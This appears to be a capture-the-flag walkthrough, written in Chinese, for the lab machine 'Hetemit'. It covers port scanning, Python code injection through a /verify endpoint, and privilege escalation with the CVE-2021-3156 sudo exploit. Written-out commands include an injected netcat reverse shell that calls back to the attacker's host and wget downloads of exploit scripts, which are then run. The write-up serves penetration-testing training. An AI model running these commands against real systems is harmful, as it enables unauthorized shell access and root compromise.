###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Hetemit
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.172.117 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.172.117:21
Open 192.168.172.117:22
Open 192.168.172.117:80
Open 192.168.172.117:139
Open 192.168.172.117:445
Open 192.168.172.117:18000
Open 192.168.172.117:50000

PORT      STATE SERVICE     REASON  VERSION
21/tcp    open  ftp         syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.245
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         syn-ack OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        syn-ack Apache httpd 2.4.37 ((centos))
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
|_http-server-header: Apache/2.4.37 (centos)
139/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
18000/tcp open  biimenu?    syn-ack
| fingerprint-strings: 
50000/tcp open  http        syn-ack Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

查看`http://192.168.172.117:50000/`
```
{'/generate', '/verify'}
```

查看`http://192.168.172.117:50000/verify`
```
{'code'}
```

執行
```
┌──(kali㉿kali)-[~/pgplay]
└─$ curl -X post --data "code=2*2" http://192.168.172.117:50000/verify                   
4
```

確認os可用執行reverseshell
```
┌──(kali㉿kali)-[~/pgplay]
└─$ curl -X post --data "code=os" http://192.168.172.117:50000/verify
<module 'os' from '/usr/lib64/python3.6/os.py'>

┌──(kali㉿kali)-[~/pgplay]
└─$ curl -X post --data "code=os.system('nc 192.168.45.245 445 -e /bin/sh')" http://192.168.172.117:50000/verify

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445
```

在`/home/cmeeks`得local.txt
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

[cmeeks@hetemit ~]$ cat local.txt
c54923812f2101eab6ad34157cbe71ef
```

`linpeas.sh`
```
[cmeeks@hetemit tmp]$ wget 192.168.45.245/linpeas.sh
[cmeeks@hetemit tmp]$ chmod +x linpeas.sh
[cmeeks@hetemit tmp]$ ./linpeas.sh

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

用[CVE-2021-3156](https://github.com/worawit/CVE-2021-3156?tab=readme-ov-file)得root，在/root得proof.txt
```
[cmeeks@hetemit tmp]$ wget 192.168.45.245/exploit_nss.py
[cmeeks@hetemit tmp]$ python3 exploit_nss.py

[root@hetemit root]# cat proof.txt
b5a29ac4a0ccf28c2359a6f34a928d7b
```